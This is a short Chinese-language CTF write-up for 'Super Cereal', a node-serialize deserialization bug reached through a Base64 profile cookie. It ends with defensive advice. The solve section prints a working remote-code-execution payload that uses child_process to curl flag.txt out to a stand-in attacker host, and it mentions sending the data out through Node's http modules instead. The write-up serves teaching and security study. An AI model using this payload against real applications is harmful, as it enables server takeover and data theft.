# Super Cereal

## 题目简述

站点把 profile Cookie 从 Base64 解码后交给 node-serialize 的 unserialize。该库会把带 _$$ND_FUNC$$_ 前缀的值恢复为 JavaScript 函数；若字符串末尾调用该函数，反序列化阶段就会执行任意代码。flag.txt 位于应用目录。

## 解题过程

构造对象：

~~~json
{
  "cereal": "_$$ND_FUNC$$_function(){process.mainModule.require('child_process').execSync('curl https://ATTACKER.example/collect --data-binary @flag.txt')}()"
}
~~~

把整段 JSON 做 Base64，作为 profile Cookie 发送到 GET /。服务执行：

~~~javascript
const str = Buffer.from(req.cookies.profile, "base64").toString();
const obj = nodeSerial.unserialize(str);
~~~

IIFE 在 unserialize 返回前已经运行，child_process 启动 curl，将 flag.txt 以 POST 数据发到接收端。Docker 镜像提供 curl 和 shell，无需依赖页面回显。收到：

~~~text
maple{0H_w41t_you_meant_ser1al_not_cer3al?}
~~~

也可以改用 Node 原生 http/https 模块外传，以避免对外部命令存在性的依赖。

## 方法总结

绝不能对客户端可控数据做能够恢复函数、类或代码的反序列化。Base64 和 HttpOnly Cookie 都不提供完整性。会话数据应使用简单 JSON schema，并用服务端密钥签名或完全存放在服务端；依赖库若历史上存在危险反序列化语义，应移除而不是只增加输入正则。
